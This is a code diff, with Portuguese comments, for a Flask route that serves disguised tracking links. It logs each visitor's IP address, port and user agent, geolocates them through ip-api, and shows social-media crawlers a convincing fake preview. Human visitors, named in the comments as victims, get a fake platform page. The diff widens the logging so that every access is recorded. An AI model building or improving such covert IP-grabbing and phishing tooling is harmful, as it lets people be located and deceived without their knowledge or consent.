@@ -265,46 +265,34 @@ def rastrear_link(slug):
     bots = ["facebookexternalhit", "twitterbot", "linkedinbot", "whatsapp", "slackbot", "telegrambot"]
     is_bot = any(bot in user_agent for bot in bots)
 
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    porta = request.environ.get('REMOTE_PORT')
+    timestamp = horario_brasilia()
+
+    # 🔎 REGISTRO DE ACESSO (bot ou humano)
+    registro = Registro(
+        ip=ip,
+        porta=porta,
+        user_agent=request.headers.get("User-Agent"),
+        timestamp=timestamp,
+        slug=slug
+    )
+    db.session.add(registro)
+
     if is_bot:
-    # Se o link ainda não foi testado, considera este acesso como o seu (criador/teste)
-            if not link.foi_testado:
-                link.foi_testado = True
-                db.session.commit()
-                return "", 204  # ignor
-            
-    if link.foi_testado:
-        # registrar IP mesmo sendo bot (vítima recebendo o link)
-        visitor_ip = request.remote_addr
-        porta = request.environ.get('REMOTE_PORT') 
-        timestamp = horario_brasilia()
-
-        novo_registro = Registro(
-            ip=visitor_ip,
-            porta=porta,
-            user_agent=request.headers.get("User-Agent"),
-            timestamp=timestamp,
-            slug=slug
-        )
-        db.session.add(novo_registro)
-        db.session.commit()
-        
-        bot_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        bot_user_agent = request.headers.get("User-Agent", "")
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-        # (Opcional) Pega a geolocalização com ip-api
+        # 🌍 GEOLOCALIZAÇÃO (opcional)
+        cidade = estado = pais = "Desconhecido"
         try:
-            geo = requests.get(f'http://ip-api.com/json/{bot_ip}').json()
-            cidade = geo.get("city")
-            estado = geo.get("regionName")
-            pais = geo.get("country")
+            geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=2).json()
+            cidade = geo.get("city", "Desconhecido")
+            estado = geo.get("regionName", "Desconhecido")
+            pais = geo.get("country", "Desconhecido")
         except:
-            cidade = estado = pais = "Desconhecido"
+            pass
 
-        # Salva no banco
         registro_bot = RegistroBot(
-            ip=bot_ip,
-            user_agent=bot_user_agent,
+            ip=ip,
+            user_agent=request.headers.get("User-Agent"),
             timestamp=timestamp,
             slug=slug,
             cidade=cidade,
@@ -312,8 +300,11 @@ def rastrear_link(slug):
             pais=pais
         )
         db.session.add(registro_bot)
-        db.session.commit()
-        # === PRÉVIA PARA BOTS ===
+
+    db.session.commit()
+
+    # 🤖 BOT PREVIEW
+    if is_bot:
         if link.preview_titulo and link.preview_imagem:
             return render_template("preview_real.html",
                 titulo=link.preview_titulo,
@@ -334,7 +325,7 @@ def rastrear_link(slug):
             )
         else:
             try:
-                headers = {"User-Agent": "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"}
+                headers = {"User-Agent": "facebookexternalhit/1.1"}
                 resposta = requests.get(link.destino, headers=headers, timeout=5)
                 soup = BeautifulSoup(resposta.text, "html.parser")
 
@@ -347,7 +338,7 @@ def rastrear_link(slug):
                 return render_template("preview_real.html",
                     titulo=og_title["content"] if og_title else "Acesse este link",
                     descricao=og_desc["content"] if og_desc else "Clique para visualizar o conteúdo.",
-                    imagem=og_image["content"] if og_image else url_for('static', filename=f'previews/{link.preview_imagem}', _external=True),
+                    imagem=og_image["content"] if og_image else url_for('static', filename='logo.png', _external=True),
                     url_destino=link.destino,
                     tipo=og_type["content"] if og_type else "website",
                     url_real=og_url["content"] if og_url else link.destino
@@ -355,24 +346,10 @@ def rastrear_link(slug):
             except:
                 return render_template("preview_fallback.html", url_destino=link.destino)
 
-    # === VISITANTE REAL ===
-    visitor_ip = request.remote_addr
-    porta = request.environ.get('REMOTE_PORT') 
-    timestamp = horario_brasilia()
-
-    novo_registro = Registro(
-        ip=visitor_ip,
-        porta=porta,
-        user_agent=request.headers.get("User-Agent"),
-        timestamp=timestamp,
-        slug=slug
-    )
-    db.session.add(novo_registro)
-    db.session.commit()
-
-    # Renderiza a plataforma falsa com botão de confirmação ou carregamento
+    # 👤 VISITANTE REAL (vítima)
     template_escolhido = f"{link.plataforma.lower()}.html"
     return render_template(template_escolhido, slug=slug, destino=link.destino, link=link)
+
 @app.route("/redir/<slug>")
 def redirecionar(slug):
     link = Link.query.filter_by(slug=slug).first_or_404()
